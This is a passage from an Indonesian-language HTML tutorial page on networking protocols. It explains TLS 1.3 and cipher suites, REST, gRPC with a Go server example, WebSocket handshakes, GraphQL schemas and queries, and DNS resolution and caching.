    <p>TLS 1.3 (2018) menyederhanakan handshake dari 2-RTT menjadi <strong>1-RTT</strong>, dan mendukung <strong>0-RTT</strong> untuk koneksi berulang:</p>

    <div class="handshake-vis">
        <div class="handshake-col">
            <div class="handshake-label">Client</div>
            <div class="handshake-label">Server</div>
        </div>
        <div class="handshake-msgs">
            <div class="hs-msg">
                <div class="hs-text">ClientHello + KeyShare</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">ServerHello + KeyShare + Cert + Finished</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">Finished + [Application Data]</div>
                <div class="hs-arrow"></div>
            </div>
        </div>
    </div>

    <div class="card-grid">
        <div class="card">
            <h4 style="color:var(--green)">Perbaikan TLS 1.3</h4>
            <ul>
                <li>Hanya 1-RTT (vs 2-RTT di TLS 1.2)</li>
                <li>0-RTT untuk session resumption (PSK)</li>
                <li>Hapus cipher suite yang lemah (RSA key exchange, CBC, RC4, SHA-1, dll)</li>
                <li>Hanya support AEAD ciphers (AES-GCM, ChaCha20-Poly1305)</li>
                <li>Seluruh handshake setelah ServerHello sudah terenkripsi</li>
                <li>Perfect Forward Secrecy (PFS) wajib via ECDHE/DHE</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--accent)">Certificate Chain Validation</h4>
            <p>Browser memvalidasi sertifikat dengan menelusuri <strong>chain of trust</strong>:</p>
            <div class="layer-diagram">
                <div class="layer-item" style="background:rgba(248,113,113,0.12)">
                    <div class="layer-num" style="background:var(--red);color:#fff">1</div>
                    <div class="layer-info">
                        <strong style="color:var(--red)">Root CA</strong>
                        <span>DigiCert, Let's Encrypt ISRG Root - sudah tertanam di OS/browser</span>
                    </div>
                </div>
                <div class="layer-item" style="background:rgba(251,146,60,0.12)">
                    <div class="layer-num" style="background:var(--orange);color:#fff">2</div>
                    <div class="layer-info">
                        <strong style="color:var(--orange)">Intermediate CA</strong>
                        <span>Ditandatangani oleh Root CA. Menerbitkan sertifikat untuk domain.</span>
                    </div>
                </div>
                <div class="layer-item" style="background:rgba(52,211,153,0.12)">
                    <div class="layer-num" style="background:var(--green);color:#fff">3</div>
                    <div class="layer-info">
                        <strong style="color:var(--green)">Server Certificate (Leaf)</strong>
                        <span>Sertifikat untuk domain spesifik (*.example.com)</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--accent3)">Cipher Suites</h3>
    <p>Cipher suite menentukan algoritma yang digunakan untuk setiap aspek keamanan:</p>
    <div class="code-block"><span class="cm">// Format Cipher Suite TLS 1.2</span>
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 |     |     |        |    |     |
 |     |     |        |    |     +-- Hash: SHA-384 (integrity)
 |     |     |        |    +-------- Mode: GCM (Galois/Counter Mode)
 |     |     |        +------------- Encryption: AES-256 (symmetric)
 |     |     +---------------------- Authentication: RSA (verify server)
 |     +---------------------------- Key Exchange: ECDHE (forward secrecy)
 +---------------------------------- Protocol: TLS

<span class="cm">// TLS 1.3 - Simplified (hanya 5 cipher suites)</span>
TLS_AES_256_GCM_SHA384        <span class="cm">// Key exchange selalu ECDHE (implicit)</span>
TLS_AES_128_GCM_SHA256
TLS_CHACHA20_POLY1305_SHA256  <span class="cm">// Cepat di mobile (tanpa AES-NI)</span></div>
</div>

<div class="card animate-in">
    <h3>TLS Handshake Animation</h3>
    <div class="anim-container">
        <canvas id="canvas-tls-handshake" width="700" height="350" style="width:100%;max-width:700px;background:var(--surface);border-radius:8px"></canvas>
    </div>
    <div class="anim-controls">
        <button class="anim-btn" onclick="tlsHandshakeAnim.start()">Play TLS 1.3 Handshake</button>
        <button class="anim-btn" onclick="tlsHandshakeAnim.reset()">Reset</button>
    </div>
</div>

<!-- ==================== 6. RESTful API ==================== -->
<h2 class="animate-in">6. RESTful API</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">REST Principles (Roy Fielding, 2000)</h3>
    <p><strong>RE</strong>presentational <strong>S</strong>tate <strong>T</strong>ransfer - arsitektur berbasis resource yang memanfaatkan HTTP sepenuhnya.</p>

    <div class="card-grid-3">
        <div class="card">
            <span class="badge badge-blue">Stateless</span>
            <p>Setiap request membawa semua informasi yang dibutuhkan. Server tidak menyimpan state antar request.</p>
        </div>
        <div class="card">
            <span class="badge badge-green">Uniform Interface</span>
            <p>Resource diidentifikasi oleh URI. Manipulasi melalui representasi (JSON/XML). Self-descriptive messages.</p>
        </div>
        <div class="card">
            <span class="badge badge-orange">Client-Server</span>
            <p>Pemisahan concern. Client menangani UI, server menangani data storage dan business logic.</p>
        </div>
        <div class="card">
            <span class="badge badge-purple">Cacheable</span>
            <p>Response harus mendeklarasikan apakah bisa di-cache. Mengurangi beban server drastis.</p>
        </div>
        <div class="card">
            <span class="badge badge-red">Layered System</span>
            <p>Client tidak tahu apakah terhubung langsung ke server atau melalui load balancer/CDN/proxy.</p>
        </div>
        <div class="card">
            <span class="badge badge-yellow">HATEOAS</span>
            <p>Hypermedia As The Engine Of Application State. Response berisi link ke aksi selanjutnya yang tersedia.</p>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--green)">HTTP Methods & Status Codes</h3>
    <div class="table-wrapper">
    <table>
    <tr><th>Method</th><th>Tujuan</th><th>Idempotent</th><th>Safe</th><th>Request Body</th><th>Contoh</th></tr>
    <tr><td><span class="badge badge-green">GET</span></td><td>Baca resource</td><td>Ya</td><td>Ya</td><td>Tidak</td><td>GET /api/v1/users/42</td></tr>
    <tr><td><span class="badge badge-blue">POST</span></td><td>Buat resource baru</td><td>Tidak</td><td>Tidak</td><td>Ya</td><td>POST /api/v1/users</td></tr>
    <tr><td><span class="badge badge-orange">PUT</span></td><td>Replace seluruh resource</td><td>Ya</td><td>Tidak</td><td>Ya</td><td>PUT /api/v1/users/42</td></tr>
    <tr><td><span class="badge badge-yellow">PATCH</span></td><td>Update sebagian field</td><td>Tidak*</td><td>Tidak</td><td>Ya</td><td>PATCH /api/v1/users/42</td></tr>
    <tr><td><span class="badge badge-red">DELETE</span></td><td>Hapus resource</td><td>Ya</td><td>Tidak</td><td>Optional</td><td>DELETE /api/v1/users/42</td></tr>
    </table>
    </div>

    <h4 style="margin-top:16px">Status Codes Penting</h4>
    <div class="card-grid">
        <div class="card">
            <h4 style="color:var(--green)">2xx Success</h4>
            <ul>
                <li><strong>200 OK</strong> - Request berhasil</li>
                <li><strong>201 Created</strong> - Resource baru dibuat (POST)</li>
                <li><strong>204 No Content</strong> - Berhasil tanpa response body (DELETE)</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--accent)">3xx Redirection</h4>
            <ul>
                <li><strong>301 Moved Permanently</strong> - URL berubah permanen</li>
                <li><strong>304 Not Modified</strong> - Cache masih valid</li>
                <li><strong>307 Temporary Redirect</strong> - Redirect sementara, pertahankan method</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--orange)">4xx Client Error</h4>
            <ul>
                <li><strong>400 Bad Request</strong> - Request malformed</li>
                <li><strong>401 Unauthorized</strong> - Belum autentikasi</li>
                <li><strong>403 Forbidden</strong> - Tidak punya izin</li>
                <li><strong>404 Not Found</strong> - Resource tidak ada</li>
                <li><strong>409 Conflict</strong> - Konflik (misalnya duplikat)</li>
                <li><strong>429 Too Many Requests</strong> - Rate limit exceeded</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--red)">5xx Server Error</h4>
            <ul>
                <li><strong>500 Internal Server Error</strong> - Bug di server</li>
                <li><strong>502 Bad Gateway</strong> - Upstream server error</li>
                <li><strong>503 Service Unavailable</strong> - Server overloaded/maintenance</li>
                <li><strong>504 Gateway Timeout</strong> - Upstream timeout</li>
            </ul>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--accent3)">Request/Response Anatomy & Code Example</h3>
    <div class="card-grid">
        <div class="card">
            <h4>HTTP Request</h4>
            <div class="code-block"><span class="kw">POST</span> /api/v1/users <span class="type">HTTP/1.1</span>
Host: api.example.com
Content-Type: <span class="str">application/json</span>
Authorization: <span class="str">Bearer eyJhbGciOi...</span>
Accept: <span class="str">application/json</span>

{
  <span class="str">"name"</span>: <span class="str">"Tazkia"</span>,
  <span class="str">"email"</span>: <span class="str">"tazkia@example.com"</span>,
  <span class="str">"role"</span>: <span class="str">"admin"</span>
}</div>
        </div>
        <div class="card">
            <h4>HTTP Response</h4>
            <div class="code-block"><span class="type">HTTP/1.1</span> <span class="num">201</span> Created
Content-Type: <span class="str">application/json</span>
Location: /api/v1/users/<span class="num">42</span>
X-Request-Id: <span class="str">abc-123</span>

{
  <span class="str">"id"</span>: <span class="num">42</span>,
  <span class="str">"name"</span>: <span class="str">"Tazkia"</span>,
  <span class="str">"email"</span>: <span class="str">"tazkia@example.com"</span>,
  <span class="str">"_links"</span>: {
    <span class="str">"self"</span>: <span class="str">"/api/v1/users/42"</span>,
    <span class="str">"posts"</span>: <span class="str">"/api/v1/users/42/posts"</span>
  }
}</div>
        </div>
    </div>

    <h4 style="margin-top:12px">Best Practices REST API</h4>
    <div class="code-block"><span class="cm">// Versioning</span>
GET /api/<span class="kw">v1</span>/users          <span class="cm">// URL path versioning (paling umum)</span>
GET /api/users              <span class="cm">// Header: Accept: application/vnd.api+json;version=1</span>

<span class="cm">// Pagination</span>
GET /api/v1/users?<span class="fn">page</span>=<span class="num">2</span>&<span class="fn">limit</span>=<span class="num">20</span>&<span class="fn">sort</span>=name&<span class="fn">order</span>=asc
<span class="cm">// Response headers: X-Total-Count, Link: &lt;...&gt;; rel="next"</span>

<span class="cm">// Filtering & Search</span>
GET /api/v1/users?<span class="fn">role</span>=admin&<span class="fn">status</span>=active&<span class="fn">q</span>=tazkia

<span class="cm">// HATEOAS - Response berisi navigasi</span>
{
  <span class="str">"data"</span>: [...],
  <span class="str">"_links"</span>: {
    <span class="str">"self"</span>:  <span class="str">"/api/v1/users?page=2"</span>,
    <span class="str">"next"</span>:  <span class="str">"/api/v1/users?page=3"</span>,
    <span class="str">"prev"</span>:  <span class="str">"/api/v1/users?page=1"</span>,
    <span class="str">"first"</span>: <span class="str">"/api/v1/users?page=1"</span>,
    <span class="str">"last"</span>:  <span class="str">"/api/v1/users?page=10"</span>
  }
}</div>
</div>

<!-- ==================== 7. gRPC ==================== -->
<h2 class="animate-in">7. gRPC (Google Remote Procedure Call)</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">gRPC Overview</h3>
    <p>gRPC adalah framework RPC modern dari Google yang menggunakan <strong>Protocol Buffers</strong> (binary serialization) dan <strong>HTTP/2</strong> untuk komunikasi high-performance antar microservices.</p>

    <div class="pipeline">
        <div class="pipeline-stage">
            <div class="stage-title">Define .proto</div>
            <div class="stage-desc">Schema definisi</div>
        </div>
        <div class="pipeline-stage">
            <div class="stage-title">protoc compile</div>
            <div class="stage-desc">Code generation</div>
        </div>
        <div class="pipeline-stage">
            <div class="stage-title">Implement Server</div>
            <div class="stage-desc">Business logic</div>
        </div>
        <div class="pipeline-stage">
            <div class="stage-title">Call from Client</div>
            <div class="stage-desc">Seperti fungsi lokal</div>
        </div>
    </div>

    <h4>Protocol Buffer Definition</h4>
    <div class="code-block"><span class="kw">syntax</span> = <span class="str">"proto3"</span>;
<span class="kw">package</span> user;
<span class="kw">option</span> go_package = <span class="str">"./pb"</span>;

<span class="cm">// Service definition - mendefinisikan RPC methods</span>
<span class="kw">service</span> <span class="type">UserService</span> {
    <span class="cm">// Unary: satu request, satu response</span>
    <span class="kw">rpc</span> <span class="fn">GetUser</span>(<span class="type">GetUserRequest</span>) <span class="kw">returns</span> (<span class="type">User</span>);

    <span class="cm">// Server streaming: satu request, banyak response</span>
    <span class="kw">rpc</span> <span class="fn">ListUsers</span>(<span class="type">ListUsersRequest</span>) <span class="kw">returns</span> (<span class="kw">stream</span> <span class="type">User</span>);

    <span class="cm">// Client streaming: banyak request, satu response</span>
    <span class="kw">rpc</span> <span class="fn">UploadUsers</span>(<span class="kw">stream</span> <span class="type">User</span>) <span class="kw">returns</span> (<span class="type">UploadResult</span>);

    <span class="cm">// Bidirectional streaming: banyak request, banyak response</span>
    <span class="kw">rpc</span> <span class="fn">Chat</span>(<span class="kw">stream</span> <span class="type">ChatMessage</span>) <span class="kw">returns</span> (<span class="kw">stream</span> <span class="type">ChatMessage</span>);
}

<span class="kw">message</span> <span class="type">GetUserRequest</span> {
    <span class="type">int32</span> id = <span class="num">1</span>;
}

<span class="kw">message</span> <span class="type">User</span> {
    <span class="type">int32</span> id = <span class="num">1</span>;
    <span class="type">string</span> name = <span class="num">2</span>;
    <span class="type">string</span> email = <span class="num">3</span>;
    <span class="type">Role</span> role = <span class="num">4</span>;
    <span class="type">google.protobuf.Timestamp</span> created_at = <span class="num">5</span>;
}

<span class="kw">enum</span> <span class="type">Role</span> {
    ROLE_UNSPECIFIED = <span class="num">0</span>;
    ADMIN = <span class="num">1</span>;
    USER = <span class="num">2</span>;
}</div>
</div>

<div class="card-grid animate-in">
    <div class="card">
        <h3 style="color:var(--green)">gRPC Streaming Modes</h3>
        <div class="card-grid">
            <div class="card">
                <h4><span class="badge badge-blue">Unary</span></h4>
                <p>Request &rarr; Response. Seperti REST call biasa tapi binary dan lebih cepat.</p>
                <div class="flow-diagram">
                    <div class="flow-node">Client</div>
                    <div class="flow-arrow">Request &rarr;</div>
                    <div class="flow-node">Server</div>
                </div>
            </div>
            <div class="card">
                <h4><span class="badge badge-green">Server Streaming</span></h4>
                <p>Satu request, server mengirim stream of responses. Cocok untuk feed/log.</p>
                <div class="flow-diagram">
                    <div class="flow-node">Client</div>
                    <div class="flow-arrow">&larr; Stream</div>
                    <div class="flow-node">Server</div>
                </div>
            </div>
            <div class="card">
                <h4><span class="badge badge-orange">Client Streaming</span></h4>
                <p>Client mengirim stream data, server merespon satu kali. Cocok untuk upload batch.</p>
                <div class="flow-diagram">
                    <div class="flow-node">Client</div>
                    <div class="flow-arrow">Stream &rarr;</div>
                    <div class="flow-node">Server</div>
                </div>
            </div>
            <div class="card">
                <h4><span class="badge badge-purple">Bidirectional</span></h4>
                <p>Kedua pihak mengirim stream independen. Cocok untuk chat, real-time sync.</p>
                <div class="flow-diagram">
                    <div class="flow-node">Client</div>
                    <div class="flow-arrow">&harr; Stream</div>
                    <div class="flow-node">Server</div>
                </div>
            </div>
        </div>
    </div>
    <div class="card">
        <h3 style="color:var(--accent)">Go Server Implementation</h3>
        <div class="code-block"><span class="kw">package</span> main

<span class="kw">import</span> (
    <span class="str">"context"</span>
    <span class="str">"log"</span>
    <span class="str">"net"</span>
    pb <span class="str">"myapp/pb"</span>
    <span class="str">"google.golang.org/grpc"</span>
)

<span class="kw">type</span> <span class="type">server</span> <span class="kw">struct</span> {
    pb.<span class="type">UnimplementedUserServiceServer</span>
}

<span class="kw">func</span> (s *<span class="type">server</span>) <span class="fn">GetUser</span>(
    ctx context.Context,
    req *pb.GetUserRequest,
) (*pb.User, error) {
    <span class="kw">return</span> &pb.User{
        Id:   req.Id,
        Name: <span class="str">"Tazkia"</span>,
        Email: <span class="str">"tazkia@example.com"</span>,
    }, <span class="num">nil</span>
}

<span class="kw">func</span> <span class="fn">main</span>() {
    lis, _ := net.<span class="fn">Listen</span>(<span class="str">"tcp"</span>, <span class="str">":50051"</span>)
    s := grpc.<span class="fn">NewServer</span>()
    pb.<span class="fn">RegisterUserServiceServer</span>(s, &server{})
    log.<span class="fn">Fatal</span>(s.<span class="fn">Serve</span>(lis))
}</div>
    </div>
</div>

<div class="card animate-in">
    <h3>REST vs gRPC Perbandingan</h3>
    <div class="table-wrapper">
    <table>
    <tr><th>Aspek</th><th>REST</th><th>gRPC</th></tr>
    <tr><td>Format Data</td><td>JSON (text, human-readable)</td><td>Protocol Buffers (binary, compact)</td></tr>
    <tr><td>Transport</td><td>HTTP/1.1 atau HTTP/2</td><td>HTTP/2 (wajib)</td></tr>
    <tr><td>Performance</td><td>Baik</td><td>7-10x lebih cepat (binary + HTTP/2)</td></tr>
    <tr><td>Streaming</td><td>Limited (SSE, WebSocket terpisah)</td><td>Native bidirectional streaming</td></tr>
    <tr><td>Schema/Contract</td><td>OpenAPI/Swagger (optional)</td><td>.proto file (wajib, strict)</td></tr>
    <tr><td>Code Generation</td><td>Optional (swagger-codegen)</td><td>Built-in (protoc)</td></tr>
    <tr><td>Browser Support</td><td>Native</td><td>Perlu grpc-web proxy</td></tr>
    <tr><td>Debugging</td><td>Mudah (curl, Postman)</td><td>Lebih sulit (grpcurl, bloomrpc)</td></tr>
    <tr><td>Best For</td><td>Public API, web frontend</td><td>Internal microservices, real-time</td></tr>
    <tr><td>Latency</td><td>Higher (text parsing + JSON marshal)</td><td>Lower (binary + persistent connection)</td></tr>
    </table>
    </div>
</div>

<!-- ==================== 8. WEBSOCKET ==================== -->
<h2 class="animate-in">8. WebSocket</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">WebSocket Protocol</h3>
    <p>WebSocket menyediakan <strong>full-duplex communication channel</strong> melalui satu koneksi TCP. Setelah upgrade handshake, client dan server bisa saling mengirim data kapan saja tanpa overhead HTTP.</p>

    <h4>Upgrade Handshake</h4>
    <div class="handshake-vis">
        <div class="handshake-col">
            <div class="handshake-label">Client</div>
            <div class="handshake-label">Server</div>
        </div>
        <div class="handshake-msgs">
            <div class="hs-msg">
                <div class="hs-text">HTTP Upgrade Request</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">101 Switching Protocols</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">WS Frame (data)</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">WS Frame (data)</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">WS Frame (data)</div>
                <div class="hs-arrow"></div>
            </div>
        </div>
    </div>

    <div class="code-block"><span class="cm">// Upgrade Request</span>
<span class="kw">GET</span> /chat <span class="type">HTTP/1.1</span>
Host: server.example.com
Upgrade: <span class="str">websocket</span>
Connection: <span class="str">Upgrade</span>
Sec-WebSocket-Key: <span class="str">dGhlIHNhbXBsZSBub25jZQ==</span>
Sec-WebSocket-Version: <span class="num">13</span>

<span class="cm">// Upgrade Response</span>
<span class="type">HTTP/1.1</span> <span class="num">101</span> Switching Protocols
Upgrade: <span class="str">websocket</span>
Connection: <span class="str">Upgrade</span>
Sec-WebSocket-Accept: <span class="str">s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span>

<span class="cm">// Setelah upgrade, komunikasi full-duplex via WebSocket frames!</span></div>
</div>

<div class="card-grid animate-in">
    <div class="card">
        <h3 style="color:var(--green)">Use Cases WebSocket</h3>
        <ul>
            <li><strong>Chat aplikasi:</strong> WhatsApp Web, Slack, Discord</li>
            <li><strong>Real-time dashboard:</strong> Stock ticker, monitoring, analytics</li>
            <li><strong>Collaborative editing:</strong> Google Docs, Figma</li>
            <li><strong>Online gaming:</strong> Multiplayer game state sync</li>
            <li><strong>Live notifications:</strong> Push notification tanpa polling</li>
            <li><strong>IoT data streaming:</strong> Sensor data real-time</li>
        </ul>
    </div>
    <div class="card">
        <h3 style="color:var(--orange)">WebSocket vs Alternatives</h3>
        <div class="table-wrapper">
        <table>
        <tr><th>Aspek</th><th>HTTP Polling</th><th>SSE</th><th>WebSocket</th></tr>
        <tr><td>Direction</td><td>Client &rarr; Server</td><td>Server &rarr; Client</td><td>Bidirectional</td></tr>
        <tr><td>Overhead</td><td>Tinggi (request berulang)</td><td>Rendah</td><td>Sangat rendah</td></tr>
        <tr><td>Latency</td><td>Tinggi (interval poll)</td><td>Rendah</td><td>Sangat rendah</td></tr>
        <tr><td>Protocol</td><td>HTTP</td><td>HTTP</td><td>WS (upgrade dari HTTP)</td></tr>
        <tr><td>Reconnect</td><td>Built-in (next poll)</td><td>Auto reconnect</td><td>Manual reconnect</td></tr>
        </table>
        </div>
    </div>
</div>

<!-- ==================== 9. GRAPHQL ==================== -->
<h2 class="animate-in">9. GraphQL</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent3)">GraphQL Overview</h3>
    <p>GraphQL adalah <strong>query language untuk API</strong> dan runtime untuk mengeksekusi query. Client menentukan <strong>persis</strong> data apa yang dibutuhkan, menghindari over-fetching dan under-fetching.</p>

    <div class="card-grid">
        <div class="card">
            <h4>Schema Definition (SDL)</h4>
            <div class="code-block"><span class="kw">type</span> <span class="type">User</span> {
    id: <span class="type">ID!</span>
    name: <span class="type">String!</span>
    email: <span class="type">String!</span>
    posts: [<span class="type">Post!</span>]!
    createdAt: <span class="type">DateTime!</span>
}

<span class="kw">type</span> <span class="type">Post</span> {
    id: <span class="type">ID!</span>
    title: <span class="type">String!</span>
    content: <span class="type">String!</span>
    author: <span class="type">User!</span>
    comments: [<span class="type">Comment!</span>]!
}

<span class="kw">type</span> <span class="type">Query</span> {
    user(id: <span class="type">ID!</span>): <span class="type">User</span>
    users(limit: <span class="type">Int</span>, offset: <span class="type">Int</span>): [<span class="type">User!</span>]!
    post(id: <span class="type">ID!</span>): <span class="type">Post</span>
}

<span class="kw">type</span> <span class="type">Mutation</span> {
    createUser(input: <span class="type">CreateUserInput!</span>): <span class="type">User!</span>
    updateUser(id: <span class="type">ID!</span>, input: <span class="type">UpdateUserInput!</span>): <span class="type">User!</span>
    deleteUser(id: <span class="type">ID!</span>): <span class="type">Boolean!</span>
}

<span class="kw">type</span> <span class="type">Subscription</span> {
    userCreated: <span class="type">User!</span>
    postAdded(userId: <span class="type">ID!</span>): <span class="type">Post!</span>
}</div>
        </div>
        <div class="card">
            <h4>Query, Mutation, Subscription</h4>
            <div class="code-block"><span class="cm"># Query - mengambil data</span>
<span class="kw">query</span> {
    user(id: <span class="str">"42"</span>) {
        name
        email
        posts(limit: <span class="num">3</span>) {
            title
            comments {
                content
            }
        }
    }
}

<span class="cm"># Mutation - mengubah data</span>
<span class="kw">mutation</span> {
    createUser(input: {
        name: <span class="str">"Tazkia"</span>
        email: <span class="str">"tazkia@mail.com"</span>
    }) {
        id
        name
    }
}

<span class="cm"># Subscription - real-time updates (via WebSocket)</span>
<span class="kw">subscription</span> {
    postAdded(userId: <span class="str">"42"</span>) {
        id
        title
        content
    }
}</div>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3>GraphQL vs REST</h3>
    <div class="table-wrapper">
    <table>
    <tr><th>Aspek</th><th>REST</th><th>GraphQL</th></tr>
    <tr><td>Endpoint</td><td>Banyak (/users, /posts, /comments)</td><td>Satu (/graphql)</td></tr>
    <tr><td>Data Fetching</td><td>Server menentukan response shape</td><td>Client menentukan field yang dibutuhkan</td></tr>
    <tr><td>Over-fetching</td><td>Sering (dapat field yang tidak perlu)</td><td>Tidak (hanya field yang diminta)</td></tr>
    <tr><td>Under-fetching</td><td>Sering (perlu multiple requests)</td><td>Tidak (nested query dalam 1 request)</td></tr>
    <tr><td>Versioning</td><td>v1, v2, v3 (URL atau header)</td><td>Tidak perlu (schema evolves)</td></tr>
    <tr><td>Caching</td><td>HTTP caching (GET, ETags)</td><td>Lebih kompleks (POST-based)</td></tr>
    <tr><td>Error Handling</td><td>HTTP status codes (400, 404, 500)</td><td>Selalu 200, errors di response body</td></tr>
    <tr><td>File Upload</td><td>Native (multipart/form-data)</td><td>Butuh spec terpisah (multipart request)</td></tr>
    <tr><td>Best For</td><td>Simple CRUD, public API, caching</td><td>Complex nested data, mobile, SPA</td></tr>
    </table>
    </div>
</div>

<!-- ==================== 10. DNS RESOLUTION ==================== -->
<h2 class="animate-in">10. DNS Resolution</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">Bagaimana DNS Bekerja</h3>
    <p>DNS (Domain Name System) menerjemahkan nama domain (contoh: google.com) menjadi alamat IP. Proses resolusi melibatkan beberapa langkah:</p>

    <div class="step-list">
        <div class="step-item">
            <div class="step-num">1</div>
            <div class="step-text"><strong>Browser Cache:</strong> Browser memeriksa cache lokal. Jika domain pernah di-resolve dan TTL belum expired, gunakan IP yang tersimpan.</div>
        </div>
        <div class="step-item">
            <div class="step-num">2</div>
            <div class="step-text"><strong>OS Cache:</strong> Jika tidak ada di browser, periksa cache DNS sistem operasi (/etc/hosts di Linux, hosts file di Windows).</div>
        </div>
        <div class="step-item">
            <div class="step-num">3</div>
            <div class="step-text"><strong>Recursive Resolver (ISP):</strong> OS mengirim query ke recursive resolver (biasanya DNS ISP, Google 8.8.8.8, atau Cloudflare 1.1.1.1). Resolver ini akan melakukan pencarian iteratif.</div>
        </div>
        <div class="step-item">
            <div class="step-num">4</div>
            <div class="step-text"><strong>Root Name Server:</strong> Resolver bertanya ke root server (ada 13 set di dunia, A-M.root-servers.net). Root server mengarahkan ke TLD server.</div>
        </div>
        <div class="step-item">
            <div class="step-num">5</div>
            <div class="step-text"><strong>TLD Name Server:</strong> Server untuk .com, .org, .id, dll. Mengarahkan ke authoritative name server domain tersebut.</div>
        </div>
        <div class="step-item">
            <div class="step-num">6</div>
            <div class="step-text"><strong>Authoritative Name Server:</strong> Server yang memiliki record DNS sebenarnya. Mengembalikan IP address (A/AAAA record).</div>
        </div>
        <div class="step-item">
            <div class="step-num">7</div>
            <div class="step-text"><strong>Response & Cache:</strong> IP dikembalikan ke client dan di-cache di setiap level sesuai TTL (Time To Live).</div>
        </div>
    </div>

    <div class="packet-vis">
        <div class="packet-flow">
            <div class="packet-endpoint">Browser</div>
            <div class="packet-line"><div class="packet-msg" style="left:20%">google.com?</div></div>
            <div class="packet-endpoint">Resolver</div>
        </div>
        <div class="packet-flow">
            <div class="packet-endpoint">Resolver</div>
            <div class="packet-line"><div class="packet-msg" style="left:20%">.com?</div></div>
            <div class="packet-endpoint">Root Server</div>
        </div>
        <div class="packet-flow">
            <div class="packet-endpoint">Resolver</div>
            <div class="packet-line"><div class="packet-msg" style="left:15%">google.com?</div></div>
            <div class="packet-endpoint">TLD .com</div>
        </div>
        <div class="packet-flow">
            <div class="packet-endpoint">Resolver</div>
            <div class="packet-line"><div class="packet-msg" style="left:10%">google.com = 142.250.x.x</div></div>
            <div class="packet-endpoint">Auth NS</div>
        </div>
    </div>
</div>

<div class="card-grid animate-in">
    <div class="card">
        <h3 style="color:var(--green)">Recursive vs Iterative Query</h3>
        <div class="card-grid">
            <div class="card">
                <h4><span class="badge badge-blue">Recursive</span></h4>
                <p>Client meminta resolver untuk mendapatkan jawaban <strong>lengkap</strong>. Resolver melakukan semua pekerjaan dan mengembalikan IP akhir. Ini yang dipakai client ke ISP resolver.</p>
            </div>
            <div class="card">
                <h4><span class="badge badge-orange">Iterative</span></h4>
                <p>Server merespon dengan <strong>referral</strong> ke server berikutnya. Resolver yang melakukan query berturut-turut. Ini yang terjadi antara resolver dan name servers.</p>
            </div>
        </div>
    </div>
    <div class="card">
        <h3 style="color:var(--orange)">DNS Record Types</h3>
        <div class="table-wrapper">
        <table>
        <tr><th>Type</th><th>Nama</th><th>Fungsi</th><th>Contoh</th></tr>
        <tr><td><span class="badge badge-blue">A</span></td><td>Address</td><td>Domain &rarr; IPv4</td><td>example.com &rarr; 93.184.216.34</td></tr>
        <tr><td><span class="badge badge-green">AAAA</span></td><td>IPv6 Address</td><td>Domain &rarr; IPv6</td><td>example.com &rarr; 2606:2800:220:1::</td></tr>
        <tr><td><span class="badge badge-orange">CNAME</span></td><td>Canonical Name</td><td>Alias domain</td><td>www.example.com &rarr; example.com</td></tr>
        <tr><td><span class="badge badge-purple">MX</span></td><td>Mail Exchange</td><td>Email routing</td><td>example.com &rarr; mail.example.com (pri 10)</td></tr>
        <tr><td><span class="badge badge-red">NS</span></td><td>Name Server</td><td>DNS server authority</td><td>example.com &rarr; ns1.example.com</td></tr>
        <tr><td><span class="badge badge-yellow">TXT</span></td><td>Text</td><td>Verifikasi, SPF, DKIM</td><td>v=spf1 include:_spf.google.com</td></tr>
        <tr><td><span class="badge badge-blue">SRV</span></td><td>Service</td><td>Service discovery</td><td>_sip._tcp.example.com</td></tr>
        <tr><td><span class="badge badge-green">PTR</span></td><td>Pointer</td><td>Reverse DNS (IP &rarr; domain)</td><td>34.216.184.93 &rarr; example.com</td></tr>
        <tr><td><span class="badge badge-orange">SOA</span></td><td>Start of Authority</td><td>Zone admin info</td><td>TTL, serial, refresh interval</td></tr>
        <tr><td><span class="badge badge-purple">CAA</span></td><td>Cert Authority Auth</td><td>CA yang boleh issue cert</td><td>0 issue "letsencrypt.org"</td></tr>
        </table>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--accent3)">DNS Caching & TTL</h3>
    <p>Caching terjadi di banyak level untuk mengurangi latency dan beban pada name servers:</p>
    <div class="card-grid-3">
        <div class="card">
            <span class="badge badge-blue">Browser Cache</span>
            <p>Chrome: chrome://net-internals/#dns. Biasanya TTL 60 detik. Bisa di-flush manual.</p>
        </div>
        <div class="card">
            <span class="badge badge-green">OS Cache</span>
            <p>systemd-resolved (Linux), dnsmasq. Periksa: <code>resolvectl status</code> atau <code>ipconfig /displaydns</code> (Windows).</p>
        </div>
        <div class="card">
            <span class="badge badge-orange">Resolver Cache</span>
            <p>ISP/Public resolver (8.8.8.8, 1.1.1.1) menyimpan cache sesuai TTL dari authoritative server.</p>
        </div>
    </div>
    <div class="info-box">
        <strong>TTL (Time To Live):</strong> Berapa lama (detik) record DNS boleh di-cache sebelum harus di-query ulang. TTL rendah (60s) = update DNS cepat tapi lebih banyak query. TTL tinggi (86400s/1 hari) = lebih sedikit query tapi update lambat.
    </div>
</div>

<div class="card animate-in">
    <h3>DNS Resolution Flow Animation</h3>
    <div class="anim-container">
